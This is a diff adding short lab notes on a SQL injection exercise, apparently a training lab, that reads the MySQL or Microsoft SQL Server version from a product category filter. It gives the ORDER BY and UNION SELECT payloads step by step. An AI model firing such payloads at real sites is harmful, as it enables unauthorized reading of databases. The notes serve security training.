@@ -1,0 +1,15 @@
+Lab-08 - SQL Injection Attack, querying the database type and version of MySQL & Microsoft
+
+SQL Injection - Product Category
+
+End Goal : Display the Database version
+
+Analysis and Steps:
+1) Find number of columns
+'order by3# -> Internal Server Error
+
+2) Figure out which columns contains text
+'UNION SELECT 'a','a'#
+
+3) Output the version
+'UNION SELECT @@version, NULL#
